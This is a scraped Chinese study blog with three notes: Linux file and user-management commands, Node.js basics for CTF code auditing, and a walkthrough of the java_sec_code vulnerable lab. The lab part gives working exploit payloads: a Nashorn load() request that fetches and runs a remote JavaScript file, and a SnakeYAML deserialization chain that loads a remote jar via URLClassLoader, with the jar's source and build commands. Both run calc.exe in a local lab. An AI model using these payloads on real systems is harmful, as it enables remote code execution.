这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。\n\n&#x2F;media：  linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。\n\n&#x2F;mnt：  系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 &#x2F;mnt&#x2F; 上，然后进入该目录就可以查看光驱里的内容了。\n\n&#x2F;opt：  opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。\n\n&#x2F;proc：  proc 是 Processes(进程) 的缩写，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。  这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：\n  echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all\n\n&#x2F;root：  该目录为系统管理员，也称作超级权限者的用户主目录。\n\n&#x2F;sbin：  s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。\n\n&#x2F;selinux：   这个目录是 Redhat&#x2F;CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。\n\n&#x2F;srv：   该目录存放一些服务启动之后需要提取的数据。\n\n&#x2F;sys：\n  这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs 。\n  sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。\n  该文件系统是内核设备树的一个直观反映。\n  当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。\n\n&#x2F;tmp：  tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。\n\n&#x2F;usr：   usr 是 unix system resources(unix 系统资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。\n\n&#x2F;usr&#x2F;bin：  系统用户使用的应用程序。\n\n&#x2F;usr&#x2F;sbin：  超级用户使用的比较高级的管理程序和系统守护程序。\n\n&#x2F;usr&#x2F;src：  内核源代码默认的放置目录。\n\n&#x2F;var：  var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。\n\n&#x2F;run：  是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 &#x2F;var&#x2F;run 目录，应该让它指向 run。\n\n\n在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。\n&#x2F;etc： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。\n&#x2F;bin, &#x2F;sbin, &#x2F;usr&#x2F;bin, &#x2F;usr&#x2F;sbin: 这是系统预设的执行文件的放置目录，比如 ls 就是在 &#x2F;bin&#x2F;ls 目录下的。\n值得提出的是 &#x2F;bin、**&#x2F;usr&#x2F;bin** 是给系统用户使用的指令（除 root 外的通用用户），而&#x2F;sbin, &#x2F;usr&#x2F;sbin 则是给 root 使用的指令。\n&#x2F;var： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在 &#x2F;var&#x2F;log 目录下，另外 mail 的预设放置也是在这里。\n上述文件我感觉我知道有就行了，毕竟我是来学命令的\n2.文件管理命令注意事项：命令区分大小写\n1.查看文件列表 ls语法：\nls [-参数1参数2] [目标文件夹]# 查看当前目录下的文件列表\tls# 查看指定目录下的文件\tls /#文件路径# 查看详细信息，元数据信息(用户、组、大小、创建时间、权限信息、文件类型)\tls -l# 查看隐藏文件\tls -a # 参数并用\tls -la   \n\nls 常用选项\n\n\n\n参数\n含义\n\n\n\n-a\n显示指定目录下所有子目录与文件，包括隐藏文件\n\n\n-l\n以列表方式显示文件的详细信息\n\n\n-h\n配合 -l 以人性化的方式显示文件大小\n\n\nls通配符的使用\n\n\n\n通配符\n含义\n\n\n\n*\n代表任意个数个字符\n\n\n?\n代表任意一个字符，至少 1 个\n\n\n[]\n表示可以匹配字符组中的任一一个\n\n\n[abc]\n匹配 a、b、c 中的任意一个\n\n\n[a-f]\n匹配从 a 到 f 范围内的的任意一个字符\n\n\n注意：以 . 开头的文件为隐藏文件，需要用 -a 参数才能显示\n2.切换目录 cd\n\n\n命令\n含义\n\n\n\ncd\n切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)\n\n\ncd ~\n切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)\n\n\ncd .\n保持在当前目录不变\n\n\ncd …\n切换到上级目录\n\n\ncd -\n可以在最近两次工作目录之间来回切换\n\n\n# 绝对路径切换\tcd 绝对路径# 相对路径切换\tcd 相对路径# 例子：切换到/etc/sysconfig/networks-scripts 目录下\n\n相对路径 在输入路径时，最前面不是 &#x2F; 或者 ~，表示相对 当前目录 所在的目录位置绝对路径 在输入路径时，最前面是 &#x2F; 或者 ~，表示从 根目录&#x2F;家目录 开始的具体目录位置\n3.创建和删除文件 mkdir touch rm rmdir创建文件\n# 在当前位置新建文件夹\tmkdir 文件夹名# 在指定目录位置，创建文件夹，并创建父文件夹\tmkdir -p /a/b/文件夹名# 在当前目录下新建文件\ttouch 文件名        touch创建文件或修改文件时间如果文件 不存在，可以创建一个空白文件如果文件 已经存在，可以修改文件的末次修改日期\n\n\n\n\n选项\n含义\n\n\n\n-p\n可以递归创建目录\n\n\n删除文件\n# 删除文件\trm 文件# 删除文件夹    rmdir 文件夹\trm -r 文件夹# 强制删除不询问\trm -rf 文件\n\n实例：\ntouch door.txtrm door.txt\n\n4.复制和移动文件 cp mv复制文件\n# 拷贝文件\tcp 原文件  新文件# 拷贝文件夹\tcp -r 源文件夹 新文件夹\n\n\n\n\n选 项\n含义\n\n\n\n-i\n覆盖文件前提示\n\n\n-r\n若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名\n\n\n移动文件\n# 移动源文件到目标文件夹中\tmv 文件  文件夹# 修改文件A的名字为文件B\tmv 文件A 文件B\n\n\n\n\n选项\n含义\n\n\n\n-i\n覆盖文件前提示\n\n\n5.查看文件内容 cat less tail more# 查看文件中的全部信息(适合查看小文档)\tcat 文件名cat 命令可以用来 查看文件内容、创建文件、文件合并、追加文件内容 等功能cat 会一次显示所有的内容，适合 查看内容较少 的文本文件cat&gt;文件名 用于创建新的文件\n\n\n\n\n选项\n含义\n\n\n\n-b\n对非空输出行编号\n\n\n-n\n对输出的所有行编号\n\n\n# 以分页的方式浏览文件信息(适合查看大文档)，进入浏览模式\tless 文件名# 浏览模式快捷键\t↑ #上一行    ↓ #下一行    G #最后一页    g #第一页    空格 #下一页    /关键词 #搜索关键词# 退出浏览模式，回到Linux命令行模式    q #退出\n\n# 实时滚动显示文件的最后10行信息(默认10行)tail -f 文件名# 显示文件的最后20行信息tail -n 20 文件名tail -n -20 文件名# 显示文件信息从第20行至文件末尾tail -n +20 文件名\n\nmore file_namemore 命令可以用于分屏显示文件内容，每次只显示一页内容适合于 查看内容较多的文本文件\n\n\n\n\n操作键\n功能\n\n\n\n空格键\n显示手册页的下一屏\n\n\nEnter\n键 一次滚动手册页的一行\n\n\nb\n回滚一屏\n\n\nf\n前滚一屏\n\n\nq\n退出\n\n\n&#x2F;word\n搜索 word 字符串\n\n\n6.文件查找 find grep文件名查找\n# 语法\tfind 搜索路径 -name &quot;文件名关键词&quot;# 例子\tfind / -name &quot;passwd&quot;\tfind / -name &quot;ifcfg-*&quot;\n\n文件内容查找\n# 语法\tgrep -参数 要查找的目录范围\t# 参数\t-n 显示查找结果所在行号\t-R 递归查找目录下的所有文件# 例子\tgrep aries /etc\tgrep aries /etc/passwd    grep -R &quot;pattern&quot; /path/to/search    \n\nLinux 系统中 grep 命令是一种强大的文本搜索工具grep 允许对文本文件进行 模式查找，所谓模式查找，又被称为正则表达式。\n\n\n\n选项\n含义\n\n\n\n-n\n显示匹配行及行号\n\n\n-v\n显示不包含匹配文本的所有行（相当于求反）\n\n\n-i\n忽略大小写\n\n\n常用的两种模式查找\n\n\n\n参数\n含义\n\n\n\n^a\n行首，搜寻以 a 开头的行\n\n\nke$\n行尾，搜寻以 ke 结束的行\n\n\n7.查看文件内容  head tailhead取出文件前面几行\nhead [-n number] 文件 \n\n\n-n ：后面接数字，代表显示几行的意思\n\n默认的情况中，显示前面 10 行！若要显示前 20 行，就得要这样\n[root@www ~]# head -n 20 /etc/man.config\n\n\n\n3.其他有些命令比较独特，不知道该放哪里，就只有其他了\npwdpwd查看当前目录的绝对路径\n\nclearclear清除屏幕上所有命令\n\nhistoryhistory查看命令的历史记录\n\nmanman 命令相当于手册，可以查看命令使用规则，只不过是用英文写的看不懂\n\n感觉差不多了，其他的遇到再查吧\n4.linux用户管理1.Linux系统用户账号的管理用户账号的管理工作主要涉及到用户账号的添加、修改和删除。\n添加用户账号就是在系统中创建一个新账号，然后为新账号分配用户号、用户组、主目录和登录Shell等资源。刚添加的账号是被锁定的，无法使用\n1.新建用户1、添加新的用户账号使用useradd命令，其语法如下\nuseradd 选项 用户名\n\n参数说明：\n\n选项:\n\n-c comment 指定一段注释性描述。\n-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。\n-g 用户组 指定用户所属的用户组。\n-G 用户组，用户组 指定用户所属的附加组。\n-s Shell文件 指定用户的登录Shell。\n-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。\n\n\n用户名:\n  指定新账号的登录名。\n\n\n实例1：\n# useradd –d  /home/sam -m sam\n\n实例2：\n# useradd -s /bin/sh -g group –G adm,root gem\n\n此命令新建了一个用户gem，该用户的登录Shell是 /bin/sh，它属于group用户组，同时又属于adm和root用户组，其中group用户组是其主组。\n这里可能新建组：#groupadd group及groupadd adm\n增加用户账号就是在&#x2F;etc&#x2F;passwd文件中为新用户增加一条记录，同时更新其他系统文件如&#x2F;etc&#x2F;shadow, &#x2F;etc&#x2F;group等。\nLinux提供了集成的系统管理工具userconf，它可以用来对用户账号进行统一管理。\n2.删除用户如果一个用户的账号不再使用，可以从系统中删除。删除用户账号就是要将&#x2F;etc&#x2F;passwd等系统文件中的该用户记录删除，必要时还删除用户的主目录。\n删除一个已有的用户账号使用userdel命令，其格式如下：\nuserdel 选项 用户名\n\n常用的选项是 -r，它的作用是把用户的主目录一起删除\n# userdel -r sam\n\n此命令删除用户sam在系统文件中（主要是&#x2F;etc&#x2F;passwd, &#x2F;etc&#x2F;shadow, &#x2F;etc&#x2F;group等）的记录，同时删除用户的主目录\n3.修改账号修改用户账号就是根据实际情况更改用户的有关属性，如用户号、主目录、用户组、登录Shell等。\n修改已有用户的信息使用usermod命令，其格式如下：\nusermod 选项 用户名\n\n常用的选项包括**-c, -d, -m, -g, -G, -s, -u以及-o等**，这些选项的意义与useradd命令中的选项一样，可以为用户指定新的资源值。\n另外，有些系统可以使用选项：-l 新用户名\n这个选项指定一个新的账号，即将原来的用户名改为新的用户名。\n4.用户口令的管理话说为什么不叫密码\n用户管理的一项重要内容是用户口令的管理。用户账号刚创建时没有口令，但是被系统锁定，无法使用，必须为其指定口令后才可以使用，即使是指定空口令。\n指定和修改用户口令的Shell命令是passwd。超级用户可以为自己和其他用户指定口令，普通用户只能用它修改自己的口令。命令的格式为：\npasswd 选项 用户名\n\n可使用的选项：\n\n-l 锁定口令，即禁用账号。\n-u 口令解锁。\n-d 使账号无口令。\n-f 强迫用户下次登录时修改口令。\n\n如果默认用户名，则修改当前用户的口令。\n修改口令\n例如，假设当前用户是sam，则下面的命令修改该用户自己的口令：\n$ passwd Old password:****** New password:******* Re-enter new password:*******\n\n如果是超级用户，可以用下列形式指定任何用户的口令：\n# passwd sam New password:******* Re-enter new password:*******\n\n2.用户组的管理"},{"title":"nodejs","url":"/2025/06/03/nodejs/","content":"nodejs学习笔记前言之前是有过学习javascript的，但是实际上根本没深入的去学，javascript在我认为代码审计难度不虚python中那几个后端语言，也在buu上面写了几个js的题目了，我简直一句话都看不懂。\n我们审计的代码中虽然使用js写的，但实际上用到的是express框架，看来不得不去学一下了。\n由于这在CTF中占比其实不是很大，实际上也用不到，这里主要是做题中的代码审计。\n虽然nodejs和js好像没什么区别，但我要学的是nodejs一门后端语言而不是js。这就有点像flask和python\n1.nodejs简介简单的说 Node.js 就是运行在服务端的 JavaScript。\nNode.js 是一个基于 Chrome JavaScript 运行时建立的一个平台。\nNode.js 是一个事件驱动 I&#x2F;O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript 的速度非常快，性能非常好。\n在传统的 PHP 开发中，需要一个像 Apache 或 Nginx 这样的 HTTP 服务器，并且需要配置 mod_php 或 php-cgi 来处理 PHP 脚本，从而生成动态内容，也就是说 PHP 依赖于外部的 HTTP 服务器来接收请求并提供 Web 页面。\nNode.js 本身就内置了一个 HTTP 服务器模块，这意味着在使用 Node.js 开发时，开发者可以直接使用 Node.js 的 HTTP 模块来创建服务器，处理 HTTP 请求，并生成 Web 页面。因此，在 Node.js 中，Web 应用的逻辑和 HTTP 服务器的实现是紧密集成的，开发者不需要依赖于外部的 HTTP 服务器软件。\n在我们创建 Node.js 第一个 “Hello, World!” 应用前，让我们先了解下 Node.js 应用是由哪几部分组成的：\n\nrequire 指令：在 Node.js 中，使用 require 指令来加载和引入模块，引入的模块可以是内置模块，也可以是第三方模块或自定义模块。\n创建服务器：服务器可以监听客户端的请求，类似于 Apache 、Nginx 等 HTTP 服务器。\n接收请求与响应请求 服务器很容易创建，客户端可以使用浏览器或终端发送 HTTP 请求，服务器接收请求后返回响应数据。\n\n2.nodejs的语法我们之前已经知道了一个Node.js应用由require指令，创建服务器，接收请求与响应请求三部分组成，现在我们可以自己来写第一个应用\n步骤一，require指令加载和引入模块\nconst module = require(&#x27;module-name&#x27;);\n\n其中，module-name 可以是一个文件路径（相对或绝对路径），也可以是一个模块名称，如果是一个模块名称，Node.js 会自动从 node_modules 目录中查找该模块。\nrequire 指令会返回被加载的模块的导出对象，可以通过该对象来访问模块中定义的属性和方法，如果模块中有多个导出对象，则可以使用解构赋值的方式来获取它们。\n我们使用 require 指令来载入 http 模块，并将实例化的 HTTP 赋值给变量 http，实例如下:\nvar http = require(&quot;http&quot;);\n\n\n\n步骤二，创建服务器\n接下来我们使用 http.createServer() 方法创建服务器，并使用 listen 方法绑定 8888 端口。 函数通过 request, response 参数来接收和响应数据。\n实例如下，在你项目的根目录下创建一个叫 server.js 的文件，并写入以下代码：\nvar http = require(&#x27;http&#x27;);http.createServer(function (request, response) &#123;        // 发送 HTTP 头部         // HTTP 状态值: 200 : OK        // 内容类型: text/plain        response.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain&#x27;&#125;);        // 发送响应数据 &quot;Hello World&quot;        response.end(&#x27;Hello World\\n&#x27;);&#125;).listen(8888);// 终端打印如下信息console.log(&#x27;Server running at http://127.0.0.1:8888/&#x27;);\n\n以上代码我们完成了一个可以工作的 HTTP 服务器。\n使用 node 命令执行以上的代码\nnode server.jsServer running at http://127.0.0.1:8888/\n\n\n\n3.回调函数看了一下才发现这是我为什么看不懂nodejs代码的主要原因，我们先来看一段代码\nvar findUser = function(name, password)&#123;  return users.find(function(item)&#123;    return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;  &#125;);&#125;;\n\n这是CTFSHOW中很简单的一个题目，但是这个函数乍一看搞不懂，为什么function后面可以直接接参数，函数名去哪了，这些都是问题。\n基本概念\n回调函数的核心思想是：”在某个操作完成之后执行这个函数”。它允许我们实现异步编程和非阻塞操作。\n基本特点：\n\n作为参数传递：回调函数被当作参数传递给另一个函数\n延迟执行：回调函数不会立即执行，而是在特定条件满足或事件发生时被调用\n控制反转：由被调用函数决定何时执行回调\n\n在 Node.js 中，回调函数是一种异步编程模式，用于处理 I&#x2F;O 操作，如文件读写、数据库交互、网络请求等，这些操作通常需要花费较长时间，如果采用同步方式，会阻塞整个程序的执行，直到操作完成。\n使用回调函数，Node.js 可以在 I&#x2F;O 操作进行时继续执行其他代码，一旦 I&#x2F;O 操作完成，再执行回调函数。\nNode.js 是单线程的，但通过事件驱动和回调机制实现异步操作。\n回调函数指的是\n这个描述的有点抽象，意思就是为了提升代码的运行速度，可以使用回调函数对文件读取，数据库交换等花费较长的时间行为。在加载回调函数的同时继续运行代码，等到加载完毕的时候再继续运行回调函数\n我们来看这两段对比代码\nvar fs = require(&quot;fs&quot;);var data = fs.readFileSync(&#x27;input.txt&#x27;);console.log(data.toString());console.log(&quot;程序执行结束!&quot;);/*$ node main.js菜鸟教程官网地址：www.runoob.com程序执行结束!*///由于未使用回调函数会先执行  var data = fs.readFileSync(&#x27;input.txt&#x27;);加载文件\n\n使用回调函数的情况\nvar fs = require(&quot;fs&quot;);fs.readFile(&#x27;input.txt&#x27;, function (err, data) &#123;    if (err) return console.error(err);    console.log(data.toString());//使用匿名函数function作为回调函数，当文件读取结束时执行回调函数&#125;);console.log(&quot;程序执行结束!&quot;);/*$ node main.js程序执行结束!菜鸟教程官网地址：www.runoob.com*/\n\n回调函数的触发条件不一，我没必要了解，只需要以后看得懂代码就行了\n说完回调函数的执行后我们就需要看看另外一个特点，函数会将回调函数作为参数去作为另外一个函数的参数，我们来看下面代码\nvar findUser = function(name, password)&#123;//定义了一个函数  return users.find(function(item)&#123;//users 是一个数组，find() 是 JavaScript 数组的原生方法，用于查找符合条件的第一个元素    return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;  &#125;);//这个函数返回了一个find方法 find必须配合回调函数进行一个数组查找&#125;;\n\n\n\n"},{"title":"java_sec_code","url":"/2025/07/22/java-sec-code/","content":"java_sec_code前言网安还是有点冷门了，这个靶场在网上没有那种特别齐全的文章，不知道有没有flag这个东西，但是看了下别人的博客好像都是看漏洞的代码然后进行审计。\n还有那个一开始的登录框好抽象，我以为是第一道题目，没想到是直接输入密码进行登录\nadminadmin123\n\n登录进行后是一个简单的前端界面\n\n\n这里面有各种漏洞主要集中在这个路径下\njava-sec-code-master\\src\\main\\java\\org\\joychou\\controller\n\n但是我看有些博客中有一些其他的路由的漏洞没有在这个index.html中，到时候再说吧\n1.RCE命令执行是我看的第一个java漏洞，也就从这里开始吧，源码是三个路由，挨个来分析代码\n&#x2F;runtime&#x2F;exec@GetMapping(&quot;/runtime/exec&quot;)//这个用于Spring框架定义路由以及一些指定条件 映射到下面这个方法    public String CommandExec(String cmd) &#123;//在方法中写入参数直接通过请求头识别并获取        Runtime run = Runtime.getRuntime();//实例化Runtime用于创建子进程执行命令        StringBuilder sb = new StringBuilder();//用于处理获得的字符串        try &#123;            Process p = run.exec(cmd);//创建子进程执行命令            BufferedInputStream in = new BufferedInputStream(p.getInputStream());//BufferedIputStream是一个缓冲输入流类，为了提高读取速率            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));//在通过BufferedReader将字节流转化为字符流便于按行读取            String tmpStr;            while ((tmpStr = inBr.readLine()) != null) &#123;                sb.append(tmpStr);//调用StringBuilder的append进行追加 将每行字符串追加到sb中// 注意：这里没有添加换行符，所有输出行会连在一起            // 如果需要保留换行，可以改为 sb.append(tmpStr).append(&quot;\\n&quot;);            &#125;            if (p.waitFor() != 0) &#123;                if (p.exitValue() == 1)                    return &quot;Command exec failed!!&quot;;            &#125;            inBr.close();            in.close();        &#125; catch (Exception e) &#123;            return e.toString();        &#125;        return sb.toString();//调用tuString()方法输出所有内容    &#125;\n\n这个代码没有什么好看的，就是直接使用exec()进行命令执行，然后输出执行结果没有什么特殊的，关键是不知道是不是权限不够的原因，无论使用cmd.exe dir还是cmd /c dir这些命令都无法执行，看来只能whoami了\n&#x2F;ProcessBuilder@GetMapping(&quot;/ProcessBuilder&quot;)    public String processBuilder(String cmd) &#123;        StringBuilder sb = new StringBuilder();        try &#123;            //String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;            //上面的代码需要修改为Windows命令执行 否则会报错            String[] arrCmd = &#123;&quot;cmd&quot;, &quot;/c&quot;, cmd&#125;;            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);            Process p = processBuilder.start();//创建子进程            BufferedInputStream in = new BufferedInputStream(p.getInputStream());            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));            String tmpStr;            while ((tmpStr = inBr.readLine()) != null) &#123;                sb.append(tmpStr);            &#125;        &#125; catch (Exception e) &#123;            return e.toString();        &#125;        return sb.toString();    &#125;\n\n这个代码相较于上一个命令执行的路由将直接使用Runtime创建子进程进行命令执行改为了使用ProcessBuilder进行命令执行\nProcessBuilder这个类支持字符串命令执行和数组命令执行，数组命令执行由于将可执行文件，选项，和命令字符串使用数组进行了分隔导致可执行文件后面参数无法进行Shell解析防止了命令注入\n原理就是将第一个参数（&quot;ls&quot;）作为可执行文件路径或名称（通过 PATH 环境变量查找）也就是我们平时ls，cat等命令都是通过环境变量中的可执行文件使用的\n后面参数（&quot;-l&quot;, &quot;my dir&quot;）就按顺序传递给程序，由于后续参数不会触发shell解析，而且参数中的各种特殊符号也被视为普通字符，导致我们无法进行命令注入\n&#x2F;jscmd@GetMapping(&quot;/jscmd&quot;)    public void jsEngine(String jsurl) throws Exception&#123;        // js nashorn javascript ecmascript        ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;);//通过getEngineByName方法 返回js的引擎接口ScriptEngine        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);//通过getBindings方法获取脚本引擎的绑定对象(Bindings)，它定义了Java与脚本语言之间的变量共享机制  后面那个ScriptContext.ENGINE_SCOPE则表示引擎级别的绑定范围常量（值为100）        String cmd = String.format(&quot;load(\\&quot;%s\\&quot;)&quot;, jsurl);//通过format方法进行字符串的格式化 让jsurl这个变量放入%s的位置        engine.eval(cmd, bindings);//先通过js引擎接口调用eval执行cmd代码， bindings构造沙箱执行的cmd脚本中的变量只会在bindings这个沙箱中存在  相应的我们可以在其他地方执行脚本的时候通过bindings执行    &#125;\n\n这个代码很明显用的是js执行eval进行代码执行，我们还是先来看一下不认识函数的详细介绍\nScriptEngine\n这个是脚本引擎的核心操作接口，也就是这个接口有很多用来操作脚本的函数，比如我们代码中用到的eval，代码中的ScriptEngineManager类就是一个ScriptEngine的实现类\nScriptEngineManager\n主要功能：\n\n自动发现和注册可用的脚本引擎\n维护引擎名称到工厂类的映射表\n提供多种获取引擎实例的方式\n\n我们代码中主要通过getEngineByName这个方法获取到js的引擎实例，使用”js”作为引擎名称获取Nashorn引擎，Nashorn是Java实现的JavaScript引擎\nBindings\nBindings 是 Java 脚本 API (javax.script) 中的核心接口，它作为 Java 与脚本语言之间的双向数据通道，管理变量绑定和共享。\n也就是说可以通过这个对象进行管理变量的绑定和共享，正如代码中那样可以在执行脚本的时候加上这个参数，让脚本中的变量存放在这个对象中，等到运行其他脚本的时候可以通过则个对象再在其他脚本中加载对象，这个就是简单的沙箱\n沙箱是一种安全隔离环境，在Java脚本引擎中主要通过Bindings实现。下面我将结合技术细节和实际示例全面解析这一概念。\n// 创建全新的Bindings作为沙箱容器Bindings sandbox = engine.createBindings();// 只暴露必要的安全APIsandbox.put(&quot;safeMath&quot;, new SafeMathUtil());sandbox.put(&quot;logger&quot;, new RestrictedLogger());// 在隔离环境中执行engine.eval(untrustedScript, sandbox);\n\n\n\n然后我们看这个代码，代码将我们输入的参数填到load()函数中再进行代码执行，在Nashorn中是用来加载外部的js文件的，也就是说我们可以利用SSRF让其去加载我们的攻击文件\neval.js\nvar Runtime = Java.type(&#x27;java.lang.Runtime&#x27;);Runtime.getRuntime().exec(&#x27;calc.exe&#x27;);//成功弹出计算器\n\n\n\npayload\nhttp://localhost:8080/rce/jscmd?jsurl=http://127.0.0.1:1999/eval.js\n\n于是这样就加载并执行了我们的js代码，和文件包含有点像\n\n\n\n\n\n\n&#x2F;vuln&#x2F;yarm@GetMapping(&quot;/vuln/yarm&quot;)    public void yarm(String content) &#123;        Yaml y = new Yaml();        y.load(content);    &#125;\n\n这个代码看起来很简单，和上一个路由一样使用了load加载文件，但是这次可不是eval执行代码，使用的是Yaml类\nYaml类\nYaml 类是 Java 中用于处理 YAML 数据的核心类，主要来自 SnakeYAML 库。它是 Java 生态中最常用的 YAML 处理工具之一。\n主要用途\n\n将 YAML 格式的字符串解析为 Java 对象（反序列化）\n将 Java 对象转换为 YAML 格式的字符串（序列化）\n\n使用实例\n// 创建 YAML 实例Yaml yaml = new Yaml();// 反序列化（YAML字符串 → Java对象）String yamlStr = &quot;name: John\\nage: 30&quot;;Map&lt;String, Object&gt; data = yaml.load(yamlStr);System.out.println(data.get(&quot;name&quot;)); // 输出 &quot;John&quot;// 序列化（Java对象 → YAML字符串）Map&lt;String, Object&gt; obj = new HashMap&lt;&gt;();obj.put(&quot;name&quot;, &quot;Alice&quot;);obj.put(&quot;age&quot;, 25);String output = yaml.dump(obj);System.out.println(output);// 输出：// name: Alice// age: 25\n\n核心方法\n\n\n\n方法\n描述\n示例\n\n\n\nload(String yaml)\n解析单个 YAML 文档\nObject obj = yaml.load(&quot;key: value&quot;)\n\n\nloadAll(String yaml)\n解析多个 YAML 文档\nIterable&lt;Object&gt; docs = yaml.loadAll(&quot;---\\ndoc1\\n---\\ndoc2&quot;)\n\n\ndump(Object data)\n序列化 Java 对象\nString yaml = yaml.dump(map)\n\n\ndumpAll(Iterator&lt;?&gt; data)\n序列化多个对象\nString yaml = yaml.dumpAll(list.iterator())\n\n\n也就是说这个Yaml类是专门用来对YAML文档进行操作的，和json数据差不多，那我们代码中使用的是load方法对YAML文档进行解析。可以将YAML文档解析为对象，属于反序列化漏洞\n传统的YAML文档使用的也是和我们之前见过的反序列化数据一样，主要包含属性类名等信息，但是YAML还可以解析YAML标签，也就是说有YAML有两种解析方法。\n一种是将普通键值对转化为数组列表等数据结构，还有一种就是解析YAML标签转化为对象触发反序列化\nYAML标签\nYAML 的 标签（Tags） 是一种核心特性，用于标识数据的类型或语义，允许 YAML 处理器在解析时对数据进行特殊处理（如类型转换、对象构造等）\nYAML 标签以 ! 或 !! 开头，后跟一个标识符，格式如下：\n# 显式标签value: !&lt;tag&gt; content# 隐式标签（通常由处理器自动推断）key: !!str 123  # 强制将数字 123 转为字符串\n\n不同编程语言的 YAML 解析器可能扩展额外标签，例如：\n\nJava（SnakeYAML）：  !!java/lang/String、!!java/util/ArrayList，甚至支持反序列化任意类（如 !!javax.script.ScriptEngineManager）。\nPython（PyYAML）：  !!python/object、!!python/tuple，可直接构造 Python 对象。\n\n也就是说这个标签分为显示和隐式两种，然后我们可以对数据进行类型转换和对象构造等特殊处理\n当标签指向java的一个具体的类的时候就会进行实例化，因此我们可以通过类的实例化像代码一样创建子进程然后进行命令执行\n实例\n!!javax.script.ScriptEngineManager [       # 表示要实例化一个 ScriptEngineManager 对象  !!java.net.URLClassLoader [[            # 构造 URLClassLoader 对象作为参数    !!java.net.URL [&quot;http://attacker.com/malicious.jar&quot;]  # 构造 URL 对象  ]]]//这个就是我们上一个路由中使用的引擎接口，然后通过对象的实例化加载其他.jar，文件，至于原理现在还不知道\n\n从网上下载下来payload，更改为Windows模式\npackage artsploit;import javax.script.ScriptEngine;import javax.script.ScriptEngineFactory;import java.io.IOException;import java.util.List;public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;    public AwesomeScriptEngineFactory() &#123;        System.out.println(&quot;[DEBUG] AwesomeScriptEngineFactory loaded!&quot;);        try &#123;            Runtime.getRuntime().exec(&quot;calc.exe&quot;);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    public String getEngineName() &#123;        return null;    &#125;    @Override    public String getEngineVersion() &#123;        return null;    &#125;    @Override    public List&lt;String&gt; getExtensions() &#123;        return null;    &#125;    @Override    public List&lt;String&gt; getMimeTypes() &#123;        return null;    &#125;    @Override    public List&lt;String&gt; getNames() &#123;        return null;    &#125;    @Override    public String getLanguageName() &#123;        return null;    &#125;    @Override    public String getLanguageVersion() &#123;        return null;    &#125;    @Override    public Object getParameter(String key) &#123;        return null;    &#125;    @Override    public String getMethodCallSyntax(String obj, String m, String... args) &#123;        return null;    &#125;    @Override    public String getOutputStatement(String toDisplay) &#123;        return null;    &#125;    @Override    public String getProgram(String... statements) &#123;        return null;    &#125;    @Override    public ScriptEngine getScriptEngine() &#123;        return null;    &#125;&#125;\n\n然后我们再根据说明书使用命令将其打包为.jar文件\njavac src/artsploit/AwesomeScriptEngineFactory.javajar -cvf yaml-payload.jar -C src/ .\n\n我们再将payload改为\n?content=!!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL [&quot;http://127.0.0.1:1999/yaml-payload.jar&quot;]  ]]]\n\n成功弹出计算器\n\n\n然后就是一开始不知道是加载文件错误导致，我更换.jar文件后但是靶场加载的文件好像没换，后面看控制台的输出发现了这个问题，所以说当不知道怎么回事的时候重启一下apache或者靶场搞不好就可以了\n&#x2F;groovy@GetMapping(&quot;groovy&quot;)    public void groovyshell(String content) &#123;        GroovyShell groovyShell = new GroovyShell();        groovyShell.evaluate(content);    &#125;\n\n这里使用到了一个GroovyShell类\nGroovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 